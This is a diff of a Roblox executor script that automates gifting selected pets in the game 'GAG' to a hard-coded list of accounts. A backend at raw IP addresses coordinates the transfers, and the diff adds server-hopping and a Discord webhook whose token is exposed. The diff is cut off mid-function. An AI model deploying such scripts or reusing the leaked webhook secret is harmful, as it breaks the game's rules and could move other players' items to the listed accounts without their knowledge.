@@ -1,36 +1,50 @@
--- Авто трейд скрипт для GAG
--- Конфигурация
 getgenv().Config = {
-    Recipients = { -- Список получателей для трейда
+    Recipients = {
         "Sienasees2679",
-        "Stutecrisi37076",
         "Gamstoni12195",
+        "Stutecrisi37076",
         "Gobahbatha49885",
+        "Cuayabraho52063",
+        "Rulzyerra845",
+        "Sitchlinh683",
+        "Ohorovince98806",
     },
-    PetsToTrade = { -- Список питомцев для трейда
+    PetsToTrade = {
+        "French Fry Ferret",
         "Lobster Thermidor",
     },
-    Enabled = true, -- Включить/выключить авто трейд
-    BackendURL = "http://102.129.138.106:3000", -- URL бекенд сервера
-    UseBackend = true, -- Использовать бекенд для координации
-    AutoTeleport = true, -- Автоматически телепортироваться к получателю
-    SkipTeleportIfNoPets = true, -- Пропускать телепорт если нет питомцев для трейда
-    LeaveServerAfterTrade = true, -- Выход с сервера после трейда (для отправителей)
-    MaxPetsPerAccount = 55, -- Максимальное количество питомцев на аккаунт
-    TradeTimeout = 300, -- Таймаут трейда в секундах (5 минут)
-    ServerSelectionTimeout = 30, -- Таймаут выбора сервера в секундах
-    AutoRejoinOnVipServer = false, -- Автоматически переходить с VIP серверов
-    QueueCheckInterval = 30 -- Интервал проверки очереди в секундах
+    RecipientPetMap = {
+        ["Sienasees2679"] = {"Lobster Thermidor"},
+        ["Gamstoni12195"] = {"Lobster Thermidor"},
+        ["Stutecrisi37076"] = {"Lobster Thermidor"},
+        ["Gobahbatha49885"] = {"Lobster Thermidor"},
+        ["Cuayabraho52063"] = {"French Fry Ferret"},
+        ["Rulzyerra845"] = {"French Fry Ferret"},
+        ["Sitchlinh683"] = {"French Fry Ferret"},
+        ["Ohorovince98806"] = {"French Fry Ferret"},
+    },
+    Enabled = true,
+    BackendURL = "http://45.150.128.26:8000",
+    UseBackend = true,
+    AutoTeleport = true,
+    SkipTeleportIfNoPets = true,
+    LeaveServerAfterTrade = true,
+    DiscordWebhook = "https://discord.com/api/webhooks/1405625962657480815/BMlUrUwfIWNqvBCjn_aAGjYzr0Pmls3K8jaI32YbrAZreumG10S-x3FNN-9ulviO-1zi",
+    DiscordNotifications = true,
+    -- Умный поиск серверов для реципиентов
+    SmartServerSearch = true,
+    MinFreeSlots = 2, -- минимальное количество свободных слотов на сервере
+    PreferLowerPopulation = true, -- отдавать предпочтение менее заполненным серверам
+    ServerScanPages = 3, -- сколько страниц API просматривать (по 100 серверов на страницу)
+    AvoidNearlyFullThreshold = 0.9 -- избегать серверов, заполненных на 90% и более
 }
 
--- Сервисы
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 
--- GUI для сообщений
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "AutoTradeGUI"
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -53,7 +67,7 @@ Title.Size = UDim2.new(1, 0, 0, 35)
 Title.Position = UDim2.new(0, 0, 0, 0)
 Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.Text = "Авто Трейд Статус"
+Title.Text = "Auto Trade Status"
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Frame
@@ -62,7 +76,6 @@ local UICorner2 = Instance.new("UICorner")
 UICorner2.CornerRadius = UDim.new(0, 8)
 UICorner2.Parent = Title
 
--- Кнопка копирования
 local CopyButton = Instance.new("TextButton")
 CopyButton.Name = "CopyButton"
 CopyButton.Size = UDim2.new(0, 80, 0, 25)
@@ -78,7 +91,6 @@ local UICorner4 = Instance.new("UICorner")
 UICorner4.CornerRadius = UDim.new(0, 4)
 UICorner4.Parent = CopyButton
 
--- Кнопка закрытия
 local CloseButton = Instance.new("TextButton")
 CloseButton.Name = "CloseButton"
 CloseButton.Size = UDim2.new(0, 80, 0, 25)
@@ -112,10 +124,8 @@ UIListLayout.Parent = ScrollingFrame
 UIListLayout.Padding = UDim.new(0, 2)
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
--- Массив для хранения всех сообщений
 local allMessages = {}
 
--- Функция для добавления сообщений в GUI
 local function AddMessage(message, messageType)
     messageType = messageType or "info"
     
@@ -126,7 +136,6 @@ local function AddMessage(message, messageType)
         error = Color3.fromRGB(255, 0, 0)
     }
     
-    -- Добавляем сообщение в массив
     table.insert(allMessages, message)
     
     local TextLabel = Instance.new("TextLabel")
@@ -139,26 +148,21 @@ local function AddMessage(message, messageType)
     TextLabel.TextXAlignment = Enum.TextXAlignment.Left
     TextLabel.Parent = ScrollingFrame
     
-    -- Ограничиваем количество сообщений
     local children = ScrollingFrame:GetChildren()
     if #children > 50 then
         children[1]:Destroy()
     end
     
-    -- Автоматическая прокрутка вниз
     ScrollingFrame.CanvasPosition = Vector2.new(0, ScrollingFrame.CanvasSize.Y.Offset)
 end
 
--- Функция для копирования всех сообщений
 local function CopyAllMessages()
     local clipboard = table.concat(allMessages, "\n")
     
-    -- Используем setclipboard если доступен
     if setclipboard then
         setclipboard(clipboard)
         AddMessage("Все сообщения скопированы в буфер обмена!", "success")
     else
-        -- Альтернативный способ через GUI
         local clipboardGui = Instance.new("ScreenGui")
         clipboardGui.Name = "ClipboardGui"
         clipboardGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -213,21 +217,17 @@ local function CopyAllMessages()
     end
 end
 
--- Подключаем кнопку копирования
 CopyButton.MouseButton1Click:Connect(CopyAllMessages)
 
--- Подключаем кнопку закрытия
 CloseButton.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
     AddMessage("UI закрыт. Скрипт продолжает работать в фоне.", "info")
 end)
 
--- Переменные
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 local AcceptPetGift = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptPetGift")
 local GiftPet = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
 
--- Функция для получения данных питомца
 local function GetPetData(tool)
     if not tool or not tool:IsA("Tool") then
         return nil
@@ -245,7 +245,6 @@ local function GetPetData(tool)
     }
 end
 
--- Функция для получения всего инвентаря
 local function GetFullInventory()
     local inventory = {}
     local character = LocalPlayer.Character
@@ -359,10 +358,48 @@ local function IsPetInTradeList(petName)
     return false
 end
 
+-- Построение обратной мапы питомец -> множество получателей
+local function BuildPetToRecipientsMap()
+    local map = {}
+    local prefs = getgenv().Config.RecipientPetMap or {}
+    for username, petList in pairs(prefs) do
+        if type(petList) == "string" then
+            petList = {petList}
+        end
+        for _, name in pairs(petList) do
+            local base = GetBasePetName(name)
+            map[base] = map[base] or {}
+            map[base][username] = true
+        end
+    end
+    return map
+end
+
+-- Разрешен ли питомец для конкретного получателя согласно маппингу
+local function IsPetAllowedForRecipient(petName, recipient, petToRecipients)
+    local base = GetBasePetName(petName)
+    if petToRecipients[base] then
+        return petToRecipients[base][recipient] == true
+    end
+    return true
+end
+
+-- Есть ли в инвентаре питомцы, подходящие под маппинг для получателя
+local function HasPetsForRecipient(recipient)
+    local petToRecipients = BuildPetToRecipientsMap()
+    local pets = GetPetsInInventory()
+    for _, petData in pairs(pets) do
+        if IsPetInTradeList(petData.Name) and IsPetAllowedForRecipient(petData.Name, recipient, petToRecipients) then
+            return true
+        end
+    end
+    return false
+end
+
 -- Функция для HTTP запросов к бекенду
 local function MakeHttpRequest(url, method, data)
     -- Пробуем разные варианты HTTP запросов
-    local request = http_request or syn.request or request or HttpService.RequestAsync
+    local request = http_request or (syn and syn.request) or request or HttpService.RequestAsync
     
     -- Отладочная информация о доступных методах
     if http_request then
@@ -439,21 +476,14 @@ local function MakeHttpRequest(url, method, data)
     end)
     
     if success and result then
-        -- Проверяем, что результат не пустой
-        if result and result ~= "" then
-            local success2, decoded = pcall(function()
-                return HttpService:JSONDecode(result)
-            end)
-            
-            if success2 then
-                return decoded
-            else
-                AddMessage("Ошибка декодирования JSON: " .. tostring(decoded), "error")
-                AddMessage("Полученный ответ: " .. tostring(result), "error")
-                return nil
-            end
+        local success2, decoded = pcall(function()
+            return HttpService:JSONDecode(result)
+        end)
+        
+        if success2 then
+            return decoded
         else
-            AddMessage("Получен пустой ответ от сервера", "error")
+            AddMessage("Ошибка декодирования JSON: " .. tostring(decoded), "error")
             return nil
         end
     else
@@ -462,10 +492,136 @@ local function MakeHttpRequest(url, method, data)
     end
 end
 
--- Функция для проверки, является ли сервер VIP (только один игрок)
+-- =====================
+-- УМНЫЙ ПОИСК СЕРВЕРОВ
+-- =====================
+-- Roblox public servers listing endpoint: https://games.roblox.com/v1/games/{placeId}/servers/Public?sortOrder=Asc&limit=100&cursor=
+local function FetchPublicServersPage(placeId, cursor)
+    local base = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Asc&limit=100"
+    if cursor and cursor ~= "" then
+        base = base .. "&cursor=" .. cursor
+    end
+    local response = MakeHttpRequest(base, "GET")
+    if response and response.data then
+        return response
+    end
+    return nil
+end
+
+local function ScoreServer(entry, minFreeSlots, preferLowerPopulation, avoidNearlyFullThreshold)
+    local playing = entry.playing or 0
+    local maxPlayers = entry.maxPlayers or game.Players.MaxPlayers
+    local free = math.max(maxPlayers - playing, 0)
+    local nearlyFull = (playing / math.max(maxPlayers, 1)) >= avoidNearlyFullThreshold
+    local pingMs = tonumber(entry.ping) or nil
+
+    if free < minFreeSlots then
+        return -1 -- отбрасываем как не подходящий
+    end
+    -- Базовый скор: больше свободных слотов = лучше
+    local score = free * 10
+    -- Наказание за почти полный
+    if nearlyFull then
+        score = score - 50
+    end
+    -- Если предпочитаем меньшую заполняемость, уменьшим очки серверов с большим playing
+    if preferLowerPopulation then
+        score = score - playing
+    end
+    -- Чем меньше пинг, тем лучше. Мягкое влияние, если пинг известен
+    if pingMs then
+        score = score - (pingMs / 50)
+    end
+    return score
+end
+
+local function FindBestPublicServer(placeId)
+    if not getgenv().Config.SmartServerSearch then return nil end
+
+    local minFree = getgenv().Config.MinFreeSlots or 2
+    local preferLow = getgenv().Config.PreferLowerPopulation ~= false
+    local pages = math.max((getgenv().Config.ServerScanPages or 2), 1)
+    local avoidThreshold = getgenv().Config.AvoidNearlyFullThreshold or 0.9
+
+    local bestEntry = nil
+    local bestScore = -math.huge
+    local cursor = nil
+
+    for page = 1, pages do
+        local pageData = FetchPublicServersPage(placeId, cursor)
+        if not pageData then break end
+
+        for _, entry in ipairs(pageData.data or {}) do
+            -- пропускаем текущий сервер
+            if entry.id ~= game.JobId then
+                local score = ScoreServer(entry, minFree, preferLow, avoidThreshold)
+                if score and score > bestScore then
+                    bestScore = score
+                    bestEntry = entry
+                end
+            end
+        end
+
+        if not pageData.nextPageCursor or pageData.nextPageCursor == "" then
+            break
+        end
+        cursor = pageData.nextPageCursor
+        task.wait(0.1)
+    end
+
+    -- Отбрасываем, если так и не нашли подходящий
+    if bestScore < 0 then
+        return nil
+    end
+    return bestEntry
+end
+
+local function TeleportReceiverToSmartServer()
+    local placeId = 126884695634066
+    local best = FindBestPublicServer(placeId)
+    if not best then
+        AddMessage("Smart search: подходящий сервер не найден", "warning")
+        return false
+    end
+    local pingInfo = best.ping and (", ping=" .. tostring(best.ping) .. "ms") or ""
+    AddMessage("Smart search: найден сервер " .. tostring(best.id) .. " (" .. tostring(best.playing) .. "/" .. tostring(best.maxPlayers) .. ")" .. pingInfo, "info")
+    local ok, err = pcall(function()
+        TeleportService:TeleportToPlaceInstance(placeId, best.id)
+    end)
+    if ok then
+        AddMessage("Smart search: телепорт выполнен", "success")
+        return true
+    else
+        AddMessage("Smart search: ошибка телепорта: " .. tostring(err), "error")
+        return false
+    end
+end
+
+-- Функция для проверки, является ли сервер VIP
 local function IsVipServer()
-    local players = game.Players:GetPlayers()
-    return #players == 1
+    local currentPlayers = #game.Players:GetPlayers()
+    
+    -- Если мы одни на сервере, значит это VIP сервер
+    if currentPlayers == 1 then
+        return true
+    end
+    
+    -- Дополнительная проверка через JobId (на случай если есть другие индикаторы)
+    local jobId = game.JobId
+    if jobId:find("vip") or jobId:find("VIP") or jobId:find("private") or jobId:find("PRIVATE") then
+        return true
+    end
+    
+    -- Дополнительная проверка через TeleportService
+    local success, result = pcall(function()
+        return TeleportService:GetLocalPlayerTeleportData()
+    end)
+    
+    if success and result and (result.vip or result.VIP or result.private or result.PRIVATE) then
+        return true
+    end
+    
+    return false
 end
 
 -- Функция для проверки, полный ли сервер
@@ -474,85 +630,9 @@ local function IsServerFull()
     local currentPlayers = #game.Players:GetPlayers()
     
     -- Считаем сервер полным, если занято 95% мест
-    local fullThreshold = maxPlayers + 10 
+    local fullThreshold = math.floor(maxPlayers * 0.95)
     
     return currentPlayers >= fullThreshold
-end
-
--- Функция для проверки стабильности соединения
-local function IsConnectionStable()
-    -- Проверяем основные компоненты
-    if not LocalPlayer then
-        return false
-    end
-    
-    if not LocalPlayer.Character then
-        return false
-    end
-    
-    -- Проверяем сетевое соединение
-    local connection = game:GetService("NetworkClient")
-    if not connection then
-        return false
-    end
-
-    if not LocalPlayer or not LocalPlayer.Character then
-        return false
-    end
-    
-    -- Проверяем, что мы не в процессе телепорта
-    local teleportState = TeleportService:GetLocalPlayerTeleportData()
-    if teleportState and teleportState.teleporting then
-        return false
-    end
-    
-    return true
-end
-
--- Функция для ожидания стабильного соединения
-local function WaitForStableConnection(timeout)
-    timeout = timeout or 30 -- 30 секунд по умолчанию
-    local startTime = tick()
-    
-    while tick() - startTime < timeout do
-        if IsConnectionStable() then
-            return true
-        end
-        task.wait(1)
-    end
-    
-    return false
-end
-
--- Функция для проверки доступности бекенда
-local function IsBackendAvailable()
-    if not getgenv().Config.UseBackend then
-        return false
-    end
-    
-    local url = getgenv().Config.BackendURL .. "/api/stats"
-    local response = MakeHttpRequest(url, "GET")
-    
-    return response and response.success
-end
-
--- Функция для ожидания доступности бекенда
-local function WaitForBackend(timeout)
-    timeout = timeout or 60 -- 60 секунд по умолчанию
-    local startTime = tick()
-    
-    AddMessage("Ожидание доступности бекенда...", "info")
-    
-    while tick() - startTime < timeout do
-        if IsBackendAvailable() then
-            AddMessage("Бекенд доступен!", "success")
-            return true
-        end
-        task.wait(5)
-    end
-    
-    AddMessage("Бекенд недоступен после " .. timeout .. " секунд", "error")
-    return false
 end
 
 -- Функция для перехода на обычный сервер
@@ -576,48 +656,18 @@ local function RejoinNormalServer()
     
     AddMessage("Переход на обычный сервер (получатель)...", "info")
     
-    -- Добавляем задержку перед телепортом для стабильности
-    task.wait(2)
-    
-    local success, error = pcall(function()
-        TeleportService:Teleport(placeId)
-    end)
-    
-    if success then
-        AddMessage("Переход на обычный сервер запущен...", "success")
-        return true
-    else
-        AddMessage("Ошибка перехода на обычный сервер: " .. tostring(error), "error")
-        return false
-    end
-end
-
--- Функция для обработки закрытия сервера
-local function HandleServerClosing()
-    AddMessage("⚠️ Сервер закрывается! Обработка отключения...", "warning")
-    
-    -- Проверяем, являемся ли мы получателем
-    local isReceiver = false
-    for _, username in pairs(getgenv().Config.Recipients) do
-        if username == LocalPlayer.Name then
-            isReceiver = true
-            break
+    -- Только умный поиск, без стандартного Teleport
+    if getgenv().Config.SmartServerSearch then
+        local smartOk = TeleportReceiverToSmartServer()
+        if smartOk then
+            return true
+        else
+            AddMessage("Smart search не удался: подходящий сервер не найден", "warning")
+            return false
         end
-    end
-    
-    if isReceiver then
-        AddMessage("Получатель: автоматический переход на новый сервер...", "info")
-        -- Небольшая задержка перед телепортом
-        task.wait(3)
-        RejoinNormalServer()
     else
-        AddMessage("Отправитель: ожидание перехода на новый сервер...", "info")
-        -- Отправители также переходят на новый сервер при закрытии
-        task.wait(3)
-        local placeId = 126884695634066
-        pcall(function()
-            TeleportService:Teleport(placeId)
-        end)
+        AddMessage("Smart Server Search отключен — переход отменен", "warning")
+        return false
     end
 end
 
@@ -655,13 +705,31 @@ local function HasPetsForTrade()
     return hasTradePets
 end
 
--- Функция для проверки получателей через бекенд
-local function CheckReceiversViaBackend()
-    if not getgenv().Config.UseBackend then
-        return nil
+-- Function to get pets count in inventory
+local function GetPetsCountInInventory()
+    local petsInInventory = GetPetsInInventory()
+    return #petsInInventory
+end
+
+-- Function to reset inventory notification flag if inventory is normalized
+local function ResetInventoryNotificationIfNormalized()
+    if not getgenv().Config.UseBackend then return end
+    local petsCount = GetPetsCountInInventory()
+    if petsCount <= 55 then
+        local url = getgenv().Config.BackendURL .. "/api/reset-inventory-notification"
+        local data = { username = LocalPlayer.Name }
+        local response = MakeHttpRequest(url, "POST", data)
+        if response and response.success then
+            AddMessage("Inventory notification flag reset (backend)", "info")
+        end
     end
-    
-    -- Проверяем, являемся ли мы получателем
+end
+
+-- Function to check if receiver should be disabled due to inventory overflow
+local function ShouldDisableReceiverDueToOverflow()
+    -- Reset notification if inventory is normalized
+    ResetInventoryNotificationIfNormalized()
+    -- Check if we are a receiver
     local isReceiver = false
     for _, username in pairs(getgenv().Config.Recipients) do
         if username == LocalPlayer.Name then
@@ -670,38 +738,139 @@ local function CheckReceiversViaBackend()
         end
     end
     
-    -- Только получатели проверяют и переходят с VIP/полных серверов
+    -- Only receivers check for overflow
+    if not isReceiver then
+        return false
+    end
+    
+    local petsCount = GetPetsCountInInventory()
+    
+    if petsCount > 55 then
+        AddMessage("⚠️ INVENTORY OVERFLOW: " .. petsCount .. " pets!", "error")
+        AddMessage("Receiver disabled from backend due to overflow (>55 pets)", "warning")
+        AddMessage("Staying in game but not registering as receiver", "info")
+        
+        -- Проверка через backend, отправлять ли уведомление
+        local shouldNotify = true
+        if getgenv().Config.UseBackend then
+            local url = getgenv().Config.BackendURL .. "/api/notify-inventory-full"
+            local data = { username = LocalPlayer.Name }
+            local response = MakeHttpRequest(url, "POST", data)
+            if response and response.alreadyNotified then
+                shouldNotify = false
+                AddMessage("Discord notification already sent for this user (backend)", "info")
+            end
+        end
+        
+        if shouldNotify then
+            -- Send Discord notification
+            local petsInInventory = GetPetsInInventory()
+            local petsList = {}
+            for _, petData in pairs(petsInInventory) do
+                table.insert(petsList, petData.Name)
+            end
+            SendInventoryFullNotification(LocalPlayer.Name, petsCount, petsList)
+        end
+        
+        return true
+    end
+    
+    return false
+end
+
+-- Variable to track last used receiver
+getgenv().LastUsedReceiverIndex = getgenv().LastUsedReceiverIndex or 0
+
+-- Function to send Discord notification
+local function SendDiscordNotification(message, color)
+    if not getgenv().Config.DiscordNotifications or not getgenv().Config.DiscordWebhook or getgenv().Config.DiscordWebhook == "" then
+        return
+    end
+    
+    local embed = {
+        title = "Auto Trade Notification",
+        description = message,
+        color = color or 16711680, -- Red by default
+        timestamp = DateTime.now():ToIsoDateString(),
+        footer = {
+            text = "Auto Trade System"
+        }
+    }
+    
+    local data = {
+        embeds = {embed}
+    }
+    
+    local url = getgenv().Config.DiscordWebhook
+    local response = MakeHttpRequest(url, "POST", data)
+    
+    if response then
+        AddMessage("Discord notification sent", "success")
+    else
+        AddMessage("Failed to send Discord notification", "error")
+    end
+end
+
+-- Function to send inventory full notification
+local function SendInventoryFullNotification(username, petsCount, petsList)
+    if not getgenv().Config.DiscordNotifications then
+        return
+    end
+    
+    local message = "**Inventory is full!**\n"
+    message = message .. "**User:** " .. username .. "\n"
+    message = message .. "**Pets in inventory:** " .. petsCount .. "\n"
+    message = message .. "**Pets list:**\n"
+    
+    for i, petName in pairs(petsList) do
+        message = message .. i .. ". " .. petName .. "\n"
+    end
+    
+    SendDiscordNotification(message, 16711680) -- Red color
+end
+
+-- Function to check receivers via backend
+local function CheckReceiversViaBackend()
+    if not getgenv().Config.UseBackend then
+        return nil
+    end
+    
+    -- Check if we are a receiver
+    local isReceiver = false
+    for _, username in pairs(getgenv().Config.Recipients) do
+        if username == LocalPlayer.Name then
+            isReceiver = true
+            break
+        end
+    end
+    
+    -- Only receivers check and move from VIP/full servers
     if isReceiver then
-        -- Проверяем, не находимся ли мы на VIP сервере
+        -- Check if we are on VIP server
         if IsVipServer() then
-            AddMessage("Получатель: обнаружен VIP сервер, переход на обычный сервер...", "warning")
+            AddMessage("Receiver: VIP server detected, moving to normal server...", "warning")
             RejoinNormalServer()
             return nil
         end
         
-        -- Проверяем, не полный ли сервер
+        -- Check if server is full -> теперь просто ждем, не переходим
         if IsServerFull() then
-            AddMessage("Получатель: сервер полный, переход на другой сервер...", "warning")
-            RejoinNormalServer()
+            AddMessage("Receiver: server is full, waiting on current server", "info")
             return nil
         end
     else
-        -- Мы отправитель, проверяем есть ли питомцы для трейда
+        -- We are sender, check if we have pets for trading
         if not HasPetsForTrade() then
-            AddMessage("Отправитель: нет питомцев для трейда в инвентаре, ожидание...", "warning")
+            AddMessage("Sender: no pets for trading in inventory, waiting...", "warning")
             return nil
         end
         
-        -- Отправители не переходят с VIP серверов (остаются на своих)
+        -- Senders can be on VIP/full servers; still proceed to backend check
         if IsVipServer() then
-            AddMessage("Отправитель: VIP сервер, остаемся на текущем сервере", "info")
-            return nil
+            AddMessage("Sender: VIP server, proceeding to backend check", "info")
         end
-        
-        -- Отправители не переходят с полных серверов (остаются на своих)
         if IsServerFull() then
-            AddMessage("Отправитель: сервер полный, остаемся на текущем сервере", "info")
-            return nil
+            AddMessage("Sender: server is full, proceeding to backend check", "info")
         end
     end
     
@@ -710,19 +879,45 @@ local function CheckReceiversViaBackend()
     
     local response = MakeHttpRequest(url, "GET")
     if response and response.success and response.availableReceivers and #response.availableReceivers > 0 then
-        return response.availableReceivers[1] -- Возвращаем первого доступного
+        -- Фильтрация получателей по маппингу питомцев
+        local filtered = {}
+        local petToRecipients = BuildPetToRecipientsMap()
+        for _, r in ipairs(response.availableReceivers) do
+            if HasPetsForRecipient(r.username) then
+                table.insert(filtered, r)
+            end
+        end
+
+        local list = (#filtered > 0) and filtered or response.availableReceivers
+
+        -- Receiver rotation for even distribution
+        local availableCount = #list
+        
+        -- Increase index for next receiver
+        getgenv().LastUsedReceiverIndex = getgenv().LastUsedReceiverIndex + 1
+        
+        -- If index exceeds available receivers count, start from beginning
+        if getgenv().LastUsedReceiverIndex > availableCount then
+            getgenv().LastUsedReceiverIndex = 1
+        end
+        
+        local selectedReceiver = list[getgenv().LastUsedReceiverIndex]
+        
+        AddMessage("Selected receiver " .. getgenv().LastUsedReceiverIndex .. " of " .. availableCount .. ": " .. selectedReceiver.username, "info")
+        
+        return selectedReceiver
     end
     
     return nil
 end
 
--- Функция для телепорта к получателю
+-- Function to teleport to receiver
 local function TeleportToReceiver(receiverData)
     if not getgenv().Config.AutoTeleport or not receiverData then
         return false
     end
     
-    -- Проверяем, есть ли у нас питомцы для трейда (если включена настройка)
+    -- Check if we have pets for trading (if setting is enabled)
     if getgenv().Config.SkipTeleportIfNoPets then
         local isReceiver = false
         for _, username in pairs(getgenv().Config.Recipients) do
@@ -733,99 +928,105 @@ local function TeleportToReceiver(receiverData)
         end
         
         if not isReceiver and not HasPetsForTrade() then
-            AddMessage("Пропуск телепорта: нет питомцев для трейда", "warning")
+            AddMessage("Skipping teleport: no pets for trading", "warning")
             return false
         end
     end
     
-    local placeId = 126884695634066 -- ID игры GAG
+    local placeId = 126884695634066 -- GAG game ID
     local serverId = receiverData.serverId
     
-    AddMessage("Телепорт к получателю: " .. receiverData.username .. " на сервер: " .. serverId, "info")
+    AddMessage("Teleporting to receiver: " .. receiverData.username .. " on server: " .. serverId, "info")
     
     local success, error = pcall(function()
         TeleportService:TeleportToPlaceInstance(placeId, serverId)
     end)
     
     if success then
-        AddMessage("Телепорт запущен...", "success")
+        AddMessage("Teleport started...", "success")
         return true
     else
-        AddMessage("Ошибка телепорта: " .. tostring(error), "error")
+        AddMessage("Teleport error: " .. tostring(error), "error")
         return false
     end
 end
 
--- Функция для обычного присоединения к серверу (без API Roblox)
-local function JoinNormalServer()
-    local placeId = 126884695634066 -- ID игры GAG
-    
-    AddMessage("Присоединение к обычному серверу...", "info")
-    
-    local success, error = pcall(function()
-        TeleportService:Teleport(placeId)
-    end)
-    
-    if success then
-        AddMessage("Присоединение к серверу запущено...", "success")
-        return true
-    else
-        AddMessage("Ошибка присоединения к серверу: " .. tostring(error), "error")
-        return false
+-- Очередь: запрос резервации для отправителя
+local function RequestQueueReservation()
+    if not getgenv().Config.UseBackend then return nil end
+
+    -- Определяем роль: только отправитель запрашивает очередь
+    local isReceiver = false
+    for _, username in pairs(getgenv().Config.Recipients) do
+        if username == LocalPlayer.Name then
+            isReceiver = true
+            break
+        end
+    end
+    if isReceiver then return nil end
+
+    -- Если нет питомцев — выходим
+    if not HasPetsForTrade() then return nil end
+
+    local url = getgenv().Config.BackendURL .. "/api/queue/request"
+    local body = { sender = LocalPlayer.Name, receivers = getgenv().Config.Recipients }
+    local resp = MakeHttpRequest(url, "POST", body)
+    if not resp or not resp.success then return nil end
+    if resp.reserved then
+        AddMessage("Queue: reserved receiver " .. resp.reserved.receiver .. ", pos=1", "success")
+        return { username = resp.reserved.receiver, serverId = resp.reserved.serverId, jobId = resp.reserved.jobId }
+    elseif resp.queued then
+        AddMessage("Queue: queued for receiver " .. resp.queued.receiver .. ", position " .. tostring(resp.queued.position), "info")
+        return nil
+    end
+    return nil
+end
+
+-- Очередь: освободить резервацию (вызывать после завершения или отказа)
+local function ReleaseQueueReservation(receiverUsername)
+    if not getgenv().Config.UseBackend or not receiverUsername then return end
+    local url = getgenv().Config.BackendURL .. "/api/queue/release"
+    local body = { sender = LocalPlayer.Name, receiver = receiverUsername }
+    local resp = MakeHttpRequest(url, "POST", body)
+    if resp and resp.success then
+        AddMessage("Queue: reservation released for receiver " .. receiverUsername, "info")
     end
 end
 
--- Функция для завершения трейда
-local function CompleteTrade(targetReceiver, success)
-    if not getgenv().Config.UseBackend then
-        return
-    end
-    
-    local username = LocalPlayer.Name
-    
-    local data = {
-        sender = username,
-        receiver = targetReceiver,
-        success = success or true
-    }
-    
-    local url = getgenv().Config.BackendURL .. "/api/complete-trade"
-    local response = MakeHttpRequest(url, "POST", data)
-    
-    if response and response.success then
-        AddMessage("Трейд отмечен как завершенный", "success")
-        return true
-    else
-        AddMessage("Ошибка завершения трейда", "error")
-        return false
-    end
-end
-
--- Функция для поиска первого доступного игрока из списка получателей
+-- Function to find first available player from recipients list
 local function FindFirstAvailableRecipient()
-    -- Сначала проверяем, есть ли получатель на текущем сервере
+    -- First check if there's a receiver on current server
     for _, username in pairs(getgenv().Config.Recipients) do
         for _, player in pairs(Players:GetPlayers()) do
             if player.Name == username then
-                AddMessage("Найден получатель на текущем сервере: " .. player.Name, "success")
-                return player
+                -- Check mapping: do we have allowed pets for this receiver?
+                if HasPetsForRecipient(player.Name) then
+                    AddMessage("Found receiver on current server: " .. player.Name, "success")
+                    return player
+                else
+                    AddMessage("Receiver on server found but no mapped pets for them: " .. player.Name, "warning")
+                end
             end
         end
     end
     
-    -- Если получателя нет на текущем сервере, проверяем через бекенд
+    -- If no receiver on current server, check via backend
     if getgenv().Config.UseBackend then
         local backendReceiver = CheckReceiversViaBackend()
         if backendReceiver then
-            AddMessage("Найден получатель через бекенд: " .. backendReceiver.username, "success")
+            AddMessage("Found receiver via backend: " .. backendReceiver.username, "success")
             
-            -- Если включен автотелепорт И мы НЕ получатель, то телепортируемся
+            -- If autoteleport is enabled AND we are NOT receiver, then teleport
             if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= backendReceiver.username then
-                TeleportToReceiver(backendReceiver)
-                return nil -- Возвращаем nil, так как телепортируемся
+                local ok = TeleportToReceiver(backendReceiver)
+                if ok then
+                    return nil -- телепорт инициирован
+                else
+                    AddMessage("Teleport to receiver failed, will retry later", "warning")
+                end
             elseif LocalPlayer.Name == backendReceiver.username then
-                -- Мы сами получатель, не телепортируемся
-                AddMessage("Мы являемся получателем, ожидаем отправителя...", "info")
+                -- We are receiver ourselves, don't teleport
+                AddMessage("We are receiver, waiting for sender...", "info")
                 return nil
             end
         end
@@ -834,7 +1035,7 @@ local function FindFirstAvailableRecipient()
     return nil
 end
 
--- Функция для поиска игрока по имени
+-- Function to find player by name
 local function FindPlayerByName(username)
     for _, player in pairs(Players:GetPlayers()) do
         if player.Name == username then
@@ -844,15 +1045,15 @@ local function FindPlayerByName(username)
     return nil
 end
 
--- Функция для отправки питомца
+-- Function to send pet
 local function SendPet(petData, targetPlayer)
     if not petData or not targetPlayer then
         return false
     end
     
-    -- Проверяем, что питомец все еще в инвентаре
+    -- Check if pet is still in inventory
     if not petData.Tool or not petData.Tool.Parent then
-        AddMessage("Питомец больше не найден: " .. petData.Name, "error")
+        AddMessage("Pet not found anymore: " .. petData.Name, "error")
         return false
     end
     
@@ -862,15 +1063,15 @@ local function SendPet(petData, targetPlayer)
     }
     
     PetGiftingService:FireServer(unpack(args))
-    AddMessage("Отправлен питомец: " .. petData.Name .. " игроку: " .. targetPlayer.Name, "success")
+    AddMessage("Sent pet: " .. petData.Name .. " to player: " .. targetPlayer.Name, "success")
     
-    -- Небольшая задержка для обработки сервером
+    -- Small delay for server processing
     task.wait(0.2)
     
     return true
 end
 
--- Функция для принятия подарка
+-- Function to accept gift
 local function AcceptGift(giftId)
     local args = {
         true,
@@ -878,28 +1079,16 @@ local function AcceptGift(giftId)
     }
     
     AcceptPetGift:FireServer(unpack(args))
-    AddMessage("Принят подарок с ID: " .. giftId, "success")
+    AddMessage("Accepted gift with ID: " .. giftId, "success")
 end
 
--- Функция для подсчета питомцев в инвентаре
-local function CountPetsInInventory()
-    local petsInInventory = GetPetsInInventory()
-    return #petsInInventory
-end
-
--- Функция для регистрации получателя в бекенде
+-- Function to register receiver in backend
 local function RegisterAsReceiver()
